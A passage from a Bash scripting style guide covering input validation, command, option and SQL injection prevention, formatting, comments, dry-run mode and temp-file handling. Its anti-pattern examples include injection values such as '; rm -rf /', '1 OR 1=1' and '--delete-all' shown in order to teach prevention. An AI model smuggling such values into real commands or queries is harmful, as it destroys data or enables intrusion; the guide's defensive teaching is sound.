  # Resolve to absolute path
  local -- real_path
  real_path=$(realpath -e -- "$input_path") || die 22 "Invalid path: $input_path"

  # Ensure path is within allowed directory
  if [[ "$real_path" != "$allowed_dir"* ]]; then
    die 5 "Path outside allowed directory: $real_path"
  fi

  echo "$real_path"
}

# Usage
safe_path=$(validate_path "$user_path" "/var/app/data")
\`\`\`

**4. Email validation:**

\`\`\`bash
validate_email() {
  local -- email="$1"
  [[ -n "$email" ]] || die 22 'Email cannot be empty'

  # Basic email regex (not RFC-compliant but sufficient for most cases)
  local -- email_regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

  if [[ ! "$email" =~ $email_regex ]]; then
    die 22 "Invalid email format: $email"
  fi

  # Check length limits
  ((${#email} <= 254)) || die 22 "Email too long (max 254 chars): $email"

  echo "$email"
}
\`\`\`

**5. URL validation:**

\`\`\`bash
validate_url() {
  local -- url="$1"
  [[ -n "$url" ]] || die 22 'URL cannot be empty'

  # Only allow http and https schemes
  if [[ ! "$url" =~ ^https?:// ]]; then
    die 22 "URL must start with http:// or https://: $url"
  fi

  # Reject URLs with credentials (security risk)
  if [[ "$url" =~ @ ]]; then
    die 22 'URL cannot contain credentials'
  fi

  echo "$url"
}
\`\`\`

**6. Whitelist validation:**

\`\`\`bash
# Validate input against whitelist
validate_choice() {
  local -- input="$1"
  shift
  local -a valid_choices=("$@")

  local choice
  for choice in "${valid_choices[@]}"; do
    [[ "$input" == "$choice" ]] && return 0
  done

  die 22 "Invalid choice '$input'. Valid: ${valid_choices[*]}"
}

# Usage
declare -a valid_actions=('start' 'stop' 'restart' 'status')
validate_choice "$user_action" "${valid_actions[@]}"
\`\`\`

**7. Username validation:**

\`\`\`bash
validate_username() {
  local -- username="$1"
  [[ -n "$username" ]] || die 22 'Username cannot be empty'

  # Standard Unix username rules
  if [[ ! "$username" =~ ^[a-z_][a-z0-9_-]*$ ]]; then
    die 22 "Invalid username: $username"
  fi

  # Check length (typically max 32 chars on Unix)
  ((${#username} >= 1 && ${#username} <= 32)) || \
    die 22 "Username must be 1-32 characters: $username"

  echo "$username"
}
\`\`\`

**8. Command injection prevention:**

\`\`\`bash
# NEVER pass user input directly to shell
# ✗ DANGEROUS - command injection vulnerability
user_file="$1"
cat "$user_file"  # If user_file="; rm -rf /", disaster!

# ✓ Safe - validate first
validate_filename "$user_file"
cat -- "$user_file"  # Use -- to prevent option injection

# ✗ DANGEROUS - using eval with user input
eval "$user_command"  # NEVER DO THIS!

# ✓ Safe - whitelist allowed commands
case "$user_command" in
  start|stop|restart) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac
\`\`\`

**9. Option injection prevention:**

\`\`\`bash
# User input could be malicious option like "--delete-all"
user_file="$1"

# ✗ Dangerous - if user_file="--delete-all", disaster!
rm "$user_file"

# ✓ Safe - use -- separator
rm -- "$user_file"

# ✗ Dangerous - filename starting with -
ls "$user_file"  # If user_file="-la", becomes: ls -la

# ✓ Safe - use -- or prepend ./
ls -- "$user_file"
ls ./"$user_file"
\`\`\`

**10. SQL injection prevention (if generating SQL):**

\`\`\`bash
# ✗ DANGEROUS - SQL injection vulnerability
user_id="$1"
query="SELECT * FROM users WHERE id=$user_id"  # user_id="1 OR 1=1"

# ✓ Safe - validate input type first
user_id=$(validate_positive_integer "$user_id")
query="SELECT * FROM users WHERE id=$user_id"

# ✓ Better - use parameterized queries (with proper DB tools)
# This is just bash demo - use proper DB library in production
\`\`\`

**Complete validation example:**

\`\`\`bash
#!/usr/bin/env bash
set -euo pipefail

# Validation functions
validate_positive_integer() {
  local input="$1"
  [[ -n "$input" && "$input" =~ ^[0-9]+$ ]] || \
    die 22 "Invalid positive integer: $input"
  echo "$input"
}

sanitize_filename() {
  local name="$1"
  name="${name//\.\./}"
  name="${name//\//}"
  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || \
    die 22 "Invalid filename: $name"
  echo "$name"
}

# Parse and validate arguments
while (($#)); do case $1 in
  -c|--count)     noarg "$@"; shift
                  count=$(validate_positive_integer "$1") ;;
  -f|--file)      noarg "$@"; shift
                  filename=$(sanitize_filename "$1") ;;
  -*)             die 22 "Invalid option: $1" ;;
  *)              die 2 "Unexpected argument: $1" ;;
esac; shift; done

# Validate required arguments provided
[[ -n "${count:-}" ]] || die 2 'Missing required option: --count'
[[ -n "${filename:-}" ]] || die 2 'Missing required option: --file'

# Use validated input safely
for ((i=0; i<count; i+=1)); do
  echo "Processing iteration $i" >> "$filename"
done
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ WRONG - trusting user input
rm -rf "$user_dir"  # user_dir="/" = disaster!

# ✓ Correct - validate first
validate_path "$user_dir" "/safe/base/dir"
rm -rf "$user_dir"

# ✗ WRONG - weak validation
[[ -n "$filename" ]] && process "$filename"  # Not enough!

# ✓ Correct - thorough validation
filename=$(sanitize_filename "$filename")
process "$filename"

# ✗ WRONG - blacklist approach (always incomplete)
[[ "$input" != *'rm'* ]] || die 1 'Invalid input'  # Can be bypassed!

# ✓ Correct - whitelist approach
[[ "$input" =~ ^[a-zA-Z0-9]+$ ]] || die 1 'Invalid input'
\`\`\`

**Security principles:**

1. **Whitelist over blacklist**: Define what IS allowed, not what isn't
2. **Validate early**: Check input before any processing
3. **Fail securely**: Reject invalid input with clear error
4. **Use `--` separator**: Prevent option injection in commands
5. **Never use `eval`**: Especially not with user input
6. **Absolute paths**: When possible, use full paths to prevent PATH manipulation
7. **Principle of least privilege**: Run with minimum necessary permissions

**Summary:**
- **Always validate** user input before use
- **Use whitelist** validation (regex, allowed values)
- **Check type, format, range, length**
- **Use `--` separator** in commands
- **Never trust** user input, even if it "looks safe"


---


**Rule: BCS1301**

### Code Formatting

#### Indentation
- !! Use 2 spaces for indentation (NOT tabs)
- Maintain consistent indentation throughout

#### Line Length
- Keep lines under 100 characters when practical
- Long file paths and URLs can exceed 100 chars when necessary
- Use line continuation with `\` for long commands


---


**Rule: BCS1302**

#### Comments

Focus comments on explaining **WHY** (rationale, business logic, non-obvious decisions) rather than **WHAT** (which the code already shows):

\`\`\`bash
# Section separator (80 dashes)
# --------------------------------------------------------------------------------

# ✓ Good - explains WHY (rationale and special cases)
# PROFILE_DIR intentionally hardcoded to /etc/profile.d for system-wide bash profile
# integration, regardless of PREFIX. This ensures builtins are available in all
# user sessions. To override, modify this line or use a custom install method.
declare -- PROFILE_DIR=/etc/profile.d

((max_depth > 0)) || max_depth=255  # -1 means unlimited (WHY -1 is special)

# If user explicitly requested --builtin, try to install dependencies
if ((BUILTIN_REQUESTED)); then
  warn 'bash-builtins package not found, attempting to install...'
fi

# ✗ Bad - restates WHAT the code already shows
# Set PROFILE_DIR to /etc/profile.d
declare -- PROFILE_DIR=/etc/profile.d

# Check if max_depth is greater than 0, otherwise set to 255
((max_depth > 0)) || max_depth=255

# If BUILTIN_REQUESTED is non-zero
if ((BUILTIN_REQUESTED)); then
  # Print warning message
  warn 'bash-builtins package not found, attempting to install...'
fi
\`\`\`

**Good comment patterns:**
- Explain non-obvious business rules or edge cases
- Document intentional deviations from normal patterns
- Clarify complex logic that isn't immediately apparent
- Note why a specific approach was chosen over alternatives
- Warn about subtle gotchas or side effects

**Avoid commenting:**
- Simple variable assignments
- Obvious conditionals
- Standard patterns already documented in this style guide
- Code that is self-explanatory through good naming
\`\`\`


---


**Rule: BCS1303**

#### Blank Line Usage

Use blank lines strategically to improve readability by creating visual separation between logical blocks:

\`\`\`bash
#!/bin/bash
set -euo pipefail

# Script metadata
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR
                                          # ← Blank line after metadata group

# Default values                          # ← Blank line before section comment
declare -- PREFIX=/usr/local
declare -i DRY_RUN=0
                                          # ← Blank line after variable group

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
                                          # ← Blank line before function
check_prerequisites() {
  info 'Checking prerequisites...'

  # Check for gcc                         # ← Blank line after info call
  if ! command -v gcc &> /dev/null; then
    die 1 "'gcc' compiler not found."
  fi

  success 'Prerequisites check passed'    # ← Blank line between checks
}
                                          # ← Blank line between functions
main() {
  check_prerequisites
  install_files
}

main "$@"
#fin
\`\`\`

**Guidelines:**
- One blank line between functions
- One blank line between logical sections within functions
- One blank line after section comments
- One blank line between groups of related variables
- Blank lines before and after multi-line conditional or loop blocks
- Avoid multiple consecutive blank lines (one is sufficient)
- No blank line needed between short, related statements


---


**Rule: BCS1304**

#### Section Comments

Use lightweight section comments to organize code into logical groups. These are simpler than full 80-dash separators and provide just enough context:

\`\`\`bash
# Default values
declare -- PREFIX=/usr/local
declare -i VERBOSE=1
declare -i DRY_RUN=0

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- DOC_DIR="$PREFIX"/share/doc

# Core message function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  # ...
}

# Conditional messaging functions
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Unconditional messaging functions
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
\`\`\`

**Guidelines:**
- Use simple \`# Description\` format (no dashes, no box drawing)
- Keep section comments short and descriptive (2-4 words typically)
- Place section comment immediately before the group it describes
- Follow with a blank line after the group (before next section)
- Use for grouping related variables, functions, or logical blocks
- Reserve 80-dash separators for major script divisions only

**Common section comment patterns:**
- \`# Default values\` / \`# Configuration\`
- \`# Derived paths\` / \`# Computed variables\`
- \`# Core message function\`
- \`# Conditional messaging functions\` / \`# Unconditional messaging functions\`
- \`# Helper functions\` / \`# Utility functions\`
- \`# Business logic\` / \`# Main logic\`
- \`# Validation functions\` / \`# Installation functions\`


---


**Rule: BCS1305**

### Language Best Practices

#### Command Substitution
Always use `$()` instead of backticks for command substitution.

```bash
# ✓ Correct - modern syntax
var=$(command)
result=$(cat "$file" | grep pattern)

# ✗ Wrong - deprecated syntax
var=`command`
result=`cat "$file" | grep pattern`
```

**Rationale:**
- **Readability**: `$()` is visually clearer, especially with nested substitutions
- **Nesting**: `$()` nests naturally without escaping
- **Syntax highlighting**: Better editor support for `$()`
- **POSIX**: Both are POSIX, but `$()` is preferred in modern shells

**Nesting example:**
```bash
# ✓ Easy to read with $()
outer=$(echo "inner: $(date +%T)")

# ✗ Confusing with backticks (requires escaping)
outer=`echo "inner: \`date +%T\`"`
```

#### Builtin Commands vs External Commands
Always prefer shell builtins over external commands for performance and reliability.

```bash
# ✓ Good - bash builtins
addition=$((x + y))
string=${var^^}  # uppercase
string=${var,,}  # lowercase
if [[ -f "$file" ]]; then

# ✗ Avoid - external commands
addition=$(expr "$x" + "$y")
string=$(echo "$var" | tr '[:lower:]' '[:upper:]')
string=$(echo "$var" | tr '[:upper:]' '[:lower:]')
if [ -f "$file" ]; then
```

**Rationale:**
- **Performance**: Builtins are 10-100x faster (no process creation)
- **Reliability**: No dependency on external binaries or PATH
- **Portability**: Builtins guaranteed in bash, external commands might not be installed
- **Fewer failures**: No subshell creation, no pipe failures

**Performance comparison:**
```bash
# Builtin - instant
for ((i=0; i<1000; i++)); do
  result=$((i * 2))
done

# External - much slower
for ((i=0; i<1000; i++)); do
  result=$(expr $i \* 2)  # Spawns 1000 processes!
done
```

**Common replacements:**

| External Command | Builtin Alternative | Example |
|-----------------|---------------------|---------|
| `expr` | `$(())` | `$((x + y))` instead of `$(expr $x + $y)` |
| `basename` | `${var##*/}` | `${path##*/}` instead of `$(basename "$path")` |
| `dirname` | `${var%/*}` | `${path%/*}` instead of `$(dirname "$path")` |
| `tr` (case) | `${var^^}` or `${var,,}` | `${str,,}` instead of `$(echo "$str" \| tr A-Z a-z)` |
| `test`/`[` | `[[` | `[[ -f "$file" ]]` instead of `[ -f "$file" ]` |
| `seq` | `{1..10}` or `for ((i=1; i<=10; i++))` | Much faster for loops |

**When external commands are necessary:**
```bash
# Some operations have no builtin equivalent
checksum=$(sha256sum "$file")
current_user=$(whoami)
sorted_data=$(sort "$file")
```


---


**Rule: BCS1306**

### Development Practices

#### ShellCheck Compliance
ShellCheck is **compulsory** for all scripts. Use \`#shellcheck disable=...\` only for documented exceptions.

\`\`\`bash
# Document intentional violations with reason
#shellcheck disable=SC2046  # Intentional word splitting for flag expansion
set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}"

# Run shellcheck as part of development
shellcheck -x myscript.sh
\`\`\`

#### Script Termination
\`\`\`bash
# Always end scripts with #fin (or #end) marker
main "$@"
#fin

\`\`\`

#### Defensive Programming
\`\`\`bash
# Default values for critical variables
: "${VERBOSE:=0}"
: "${DEBUG:=0}"

# Validate inputs early
[[ -n "$1" ]] || die 1 'Argument required'

# Guard against unset variables
set -u
\`\`\`

#### Performance Considerations
\`\`\`bash
# Minimize subshells
# Use built-in string operations over external commands
# Batch operations when possible
# Use process substitution over temp files
\`\`\`

#### Testing Support
\`\`\`bash
# Make functions testable
# Use dependency injection for external commands
# Support verbose/debug modes
# Return meaningful exit codes
\`\`\`


---


**Rule: BCS1401**

### Debugging and Development

Enable debugging features for development and troubleshooting.

\`\`\`bash
# Debug mode implementation
declare -i DEBUG="${DEBUG:-0}"

# Enable trace mode when DEBUG is set
((DEBUG)) && set -x

# Enhanced PS4 for better trace output
export PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:+${FUNCNAME[0]}():} '

# Conditional debug output function
debug() {
  ((DEBUG)) || return 0
  >&2 _msg "$@"
}

# Usage
DEBUG=1 ./script.sh  # Run with debug output
\`\`\`


---


**Rule: BCS1402**

### Dry-Run Pattern

Implement preview mode for operations that modify system state, allowing users to see what would happen without making actual changes.

\`\`\`bash
# Declare dry-run flag
declare -i DRY_RUN=0

# Parse from command-line
-n|--dry-run) DRY_RUN=1 ;;
-N|--not-dry-run) DRY_RUN=0 ;;

# Pattern: Check flag, show preview message, return early
build_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would build standalone binaries'
    return 0
  fi

  # Actual build operations
  make standalone || die 1 'Build failed'
}

install_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install:' \
         "  $BIN_DIR/mailheader" \
         "  $BIN_DIR/mailmessage" \
         "  $BIN_DIR/mailheaderclean"
    return 0
  fi

  # Actual installation operations
  install -m 755 build/bin/mailheader "$BIN_DIR"/
  install -m 755 build/bin/mailmessage "$BIN_DIR"/
  install -m 755 build/bin/mailheaderclean "$BIN_DIR"/
}

update_man_database() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would update man database'
    return 0
  fi

  # Actual man database update
  mandb -q 2>/dev/null || true
}
\`\`\`

**Pattern structure:**
1. Check \`((DRY_RUN))\` at the start of functions that modify state
2. Display preview message with \`[DRY-RUN]\` prefix using \`info\`
3. Return early (exit code 0) without performing actual operations
4. Proceed with real operations only when dry-run is disabled

**Benefits:**
- Safe preview of destructive operations
- Users can verify paths, files, and commands before execution
- Useful for debugging installation scripts and system modifications
- Maintains identical control flow (same function calls, same logic paths)

**Rationale:** This pattern separates decision logic from action. The script flows through the same functions whether in dry-run mode or not, making it easy to verify logic without side effects.


---


**Rule: BCS1403**

### Temporary File Handling

**Always use `mktemp` to create temporary files and directories, never hard-code temp file paths. Use trap handlers to ensure cleanup occurs even on script failure or interruption. Store temp file paths in variables, make them readonly when possible, and always clean up in EXIT trap. Proper temp file handling prevents security vulnerabilities, avoids file collisions, and ensures resources are released.**

**Rationale:**

- **Security**: mktemp creates files with secure permissions (0600) in safe locations
- **Uniqueness**: Guaranteed unique filenames prevent collisions with other processes
- **Atomicity**: mktemp creates file atomically, preventing race conditions
- **Cleanup Guarantee**: EXIT trap ensures cleanup even when script fails or is interrupted
- **Resource Management**: Automatic cleanup prevents temp file accumulation
- **Portability**: mktemp works consistently across Unix-like systems
- **Predictable Location**: Uses system temp directory (TMPDIR or /tmp) appropriately

**Basic temp file creation:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Create temp file and ensure cleanup
create_temp_file() {
  local -- temp_file

  # Create temp file
  temp_file=$(mktemp) || die 1 'Failed to create temporary file'

  # Set up cleanup
  trap 'rm -f "$temp_file"' EXIT

  # Make variable readonly
  readonly -- temp_file

  info "Created temp file: $temp_file"

  # Use temp file
  echo 'Test data' > "$temp_file"
  cat "$temp_file"

  # Cleanup happens automatically via trap
}

main() {
  create_temp_file
}

main "$@"

#fin
```

**Basic temp directory creation:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Create temp directory and ensure cleanup
create_temp_dir() {
  local -- temp_dir

  # Create temp directory
  temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'

  # Set up cleanup
  trap 'rm -rf "$temp_dir"' EXIT

  # Make variable readonly
  readonly -- temp_dir

  info "Created temp directory: $temp_dir"

  # Use temp directory
  echo 'file1' > "$temp_dir/file1.txt"
  echo 'file2' > "$temp_dir/file2.txt"

  ls -la "$temp_dir"

  # Cleanup happens automatically via trap
}

main() {
  create_temp_dir
}

main "$@"

#fin
```

**Custom temp file templates:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Temp file with custom template
create_custom_temp() {
  local -- temp_file

  # Template: myapp.XXXXXX (at least 3 X's required)
  temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX) ||
    die 1 'Failed to create temporary file'

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created temp file: $temp_file"
  # Output example: /tmp/myscript.Ab3X9z

  # Use temp file
  echo 'Data' > "$temp_file"
}

# ✓ CORRECT - Temp directory with custom template
create_custom_temp_dir() {
  local -- temp_dir

  # Template for directory
  temp_dir=$(mktemp -d /tmp/"$SCRIPT_NAME"-work.XXXXXX) ||
    die 1 'Failed to create temporary directory'

  trap 'rm -rf "$temp_dir"' EXIT
  readonly -- temp_dir

  info "Created temp directory: $temp_dir"
  # Output example: /tmp/myscript-work.Xy7Pm2
}

# ✓ CORRECT - Temp file with extension
create_temp_with_extension() {
  local -- temp_file

  # mktemp doesn't support extensions directly, so add it
  temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX)
  mv "$temp_file" "$temp_file.json"
  temp_file="$temp_file.json"

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created temp file: $temp_file"

  # Use temp file
  echo '{"key": "value"}' > "$temp_file"
}

main() {
  create_custom_temp
  create_custom_temp_dir
  create_temp_with_extension
}

main "$@"

#fin
```

**Multiple temp files with cleanup:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Global array for temp files
declare -a TEMP_FILES=()

# Cleanup function for all temp files
cleanup_temp_files() {
  local -i exit_code=$?
  local -- file

  if [[ ${#TEMP_FILES[@]} -gt 0 ]]; then
    info "Cleaning up ${#TEMP_FILES[@]} temporary files"

    for file in "${TEMP_FILES[@]}"; do
      if [[ -f "$file" ]]; then
        rm -f "$file"
      elif [[ -d "$file" ]]; then
        rm -rf "$file"
      fi
    done
  fi

  return "$exit_code"
}

# Set up cleanup trap
trap cleanup_temp_files EXIT

# Create and register temp file
create_temp() {
  local -- temp_file

  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  TEMP_FILES+=("$temp_file")

  echo "$temp_file"
}

# Create and register temp directory
create_temp_dir() {
  local -- temp_dir

  temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'
  TEMP_FILES+=("$temp_dir")

  echo "$temp_dir"
}

main() {
  local -- temp1 temp2 temp_dir

  # Create multiple temp files
  temp1=$(create_temp)
  temp2=$(create_temp)
  temp_dir=$(create_temp_dir)

  readonly -- temp1 temp2 temp_dir

  info "Temp file 1: $temp1"
  info "Temp file 2: $temp2"
  info "Temp directory: $temp_dir"

  # Use temp files
  echo 'Data 1' > "$temp1"
  echo 'Data 2' > "$temp2"
  echo 'File in dir' > "$temp_dir/file.txt"

  # Cleanup happens automatically via trap
}

main "$@"

#fin
```

**Temp files with error handling:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Robust temp file creation with validation
create_temp_robust() {
  local -- temp_file

  # Create temp file
  if ! temp_file=$(mktemp 2>&1); then
    die 1 "Failed to create temporary file: $temp_file"
  fi

  # Validate temp file was created
  if [[ ! -f "$temp_file" ]]; then
    die 1 "Temp file does not exist: $temp_file"
  fi

  # Check permissions (should be 0600)
  local -- perms
  perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
  if [[ "$perms" != '600' ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has insecure permissions: $perms"
  fi

  # Set up cleanup
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created secure temp file: $temp_file (permissions: $perms)"

  echo "$temp_file"
}

main() {
  local -- temp_file
  temp_file=$(create_temp_robust)

  # Use temp file
  echo 'Sensitive data' > "$temp_file"
}

main "$@"

#fin
```

**Complete example - Data processor with temp files:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i KEEP_TEMP=0
declare -a TEMP_RESOURCES=()

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ⚠" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    debug) prefix+=" ⋯" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
debug() { ((VERBOSE >= 2)) || return 0; >&2 _msg "$@"; }

die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ============================================================================
# Cleanup Functions
# ============================================================================

cleanup() {
  local -i exit_code=$?
  local -- resource

  if ((KEEP_TEMP)); then
    if [[ ${#TEMP_RESOURCES[@]} -gt 0 ]]; then
      info 'Keeping temporary files (--keep-temp specified):'
      for resource in "${TEMP_RESOURCES[@]}"; do
        info "  $resource"
      done
    fi
    return "$exit_code"
  fi

  if [[ ${#TEMP_RESOURCES[@]} -gt 0 ]]; then
    debug "Cleaning up ${#TEMP_RESOURCES[@]} temporary resources"

    for resource in "${TEMP_RESOURCES[@]}"; do
      if [[ -f "$resource" ]]; then
        debug "Removing temp file: $resource"
        rm -f "$resource"
      elif [[ -d "$resource" ]]; then
        debug "Removing temp directory: $resource"
        rm -rf "$resource"
      fi
    done
  fi

  return "$exit_code"
}

# Set up cleanup trap
trap cleanup EXIT

# ============================================================================
# Temp Resource Management
# ============================================================================

# Create temp file and register for cleanup
make_temp_file() {
  local -- template="${1:-}"
  local -- temp_file

  if [[ -n "$template" ]]; then
    temp_file=$(mktemp "/tmp/$template.XXXXXX") ||
      die 1 "Failed to create temp file with template: $template"
  else
    temp_file=$(mktemp) ||
      die 1 'Failed to create temp file'
  fi

  # Register for cleanup
  TEMP_RESOURCES+=("$temp_file")

  debug "Created temp file: $temp_file"
  echo "$temp_file"
}

# Create temp directory and register for cleanup
make_temp_dir() {
  local -- template="${1:-}"
  local -- temp_dir

  if [[ -n "$template" ]]; then
    temp_dir=$(mktemp -d "/tmp/$template.XXXXXX") ||
      die 1 "Failed to create temp directory with template: $template"
  else
    temp_dir=$(mktemp -d) ||
      die 1 'Failed to create temp directory'
  fi

  # Register for cleanup
  TEMP_RESOURCES+=("$temp_dir")

  debug "Created temp directory: $temp_dir"
  echo "$temp_dir"
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option $1 requires an argument"
  fi
}

# ============================================================================
# Business Logic
# ============================================================================

# Process file with multiple temp files
process_file() {
  local -- input_file="$1"
  local -- output_file="$2"

  # Validate input
  if [[ ! -f "$input_file" ]]; then
    error "Input file not found: $input_file"
    return 2
  fi

  if [[ ! -r "$input_file" ]]; then
    error "Input file not readable: $input_file"
    return 1
  fi

  info "Processing: $input_file -> $output_file"

  # Create temp files for processing stages
  local -- temp_filtered temp_sorted temp_unique
  temp_filtered=$(make_temp_file "$SCRIPT_NAME-filtered")
  temp_sorted=$(make_temp_file "$SCRIPT_NAME-sorted")
  temp_unique=$(make_temp_file "$SCRIPT_NAME-unique")

  # Stage 1: Filter comments and empty lines
  debug 'Stage 1: Filtering'
  grep -v '^#' "$input_file" | grep -v '^[[:space:]]*$' > "$temp_filtered"

  local -i filtered_lines
  filtered_lines=$(wc -l < "$temp_filtered")
  debug "Filtered lines: $filtered_lines"

  # Stage 2: Sort
  debug 'Stage 2: Sorting'
  sort "$temp_filtered" > "$temp_sorted"

  # Stage 3: Remove duplicates
  debug 'Stage 3: Removing duplicates'
  sort -u "$temp_sorted" > "$temp_unique"

  local -i unique_lines
  unique_lines=$(wc -l < "$temp_unique")
  debug "Unique lines: $unique_lines"

  # Write final output
  if ((DRY_RUN)); then
    info "[DRY-RUN] Would write to: $output_file"
    info "[DRY-RUN] Output preview:"
    head -n 5 "$temp_unique"
  else
    cp "$temp_unique" "$output_file"
    success "Processed $input_file -> $output_file ($unique_lines unique lines)"
  fi

  return 0
}

# Batch process multiple files
batch_process() {
  local -a input_files=("$@")
  local -- input_file output_file
  local -i success_count=0
  local -i error_count=0

  # Create temp directory for outputs
  local -- temp_output_dir
  temp_output_dir=$(make_temp_dir "$SCRIPT_NAME-output")

  info "Processing ${#input_files[@]} files"

  for input_file in "${input_files[@]}"; do
    output_file="$temp_output_dir/${input_file##*/}.processed"

    if process_file "$input_file" "$output_file"; then
      ((success_count+=1))
    else
      ((error_count+=1))
    fi
  done

  # Report results
  info "Results: $success_count succeeded, $error_count failed"

  if ((success_count > 0)); then
    info 'Processed files:'
    ls -lh "$temp_output_dir"
  fi

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Main Function
# ============================================================================

usage() {
  cat <<'EOF'
Usage: script.sh [OPTIONS] FILE...

Process files with temporary file handling.

Options:
  -v, --verbose       Verbose output
  -vv                 Very verbose (debug) output
  -n, --dry-run       Dry-run mode
  -k, --keep-temp     Keep temporary files after completion
  -h, --help          Show this help message
  -V, --version       Show version

Arguments:
  FILE...             Input files to process

Examples:
  script.sh file.txt
  script.sh -v file1.txt file2.txt
  script.sh -k --dry-run data/*.txt
EOF
}

main() {
  local -a input_files=()

  # Parse arguments
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE=1
        ;;

      -vv)
        VERBOSE=2
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      -k|--keep-temp)
        KEEP_TEMP=1
        ;;

      -V|--version)
        echo "$SCRIPT_NAME $VERSION"
        return 0
        ;;

      -h|--help)
        usage
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option: $1"
        ;;

      *)
        input_files+=("$1")
        ;;
    esac
    shift
  done

  # Collect remaining arguments
  input_files+=("$@")

  # Make variables readonly
  readonly -- VERBOSE DRY_RUN KEEP_TEMP
  readonly -a input_files

  # Validate
  if [[ ${#input_files[@]} -eq 0 ]]; then
    error 'No input files specified'
    usage
    return 22
  fi

  # Display configuration
  if ((VERBOSE)); then
    info "$SCRIPT_NAME $VERSION"
    info "Input files: ${#input_files[@]}"
    ((DRY_RUN)) && info '[DRY-RUN] Mode enabled'
    ((KEEP_TEMP)) && info '[KEEP-TEMP] Temporary files will be preserved'
  fi

  # Process files
  batch_process "${input_files[@]}"
}

# ============================================================================
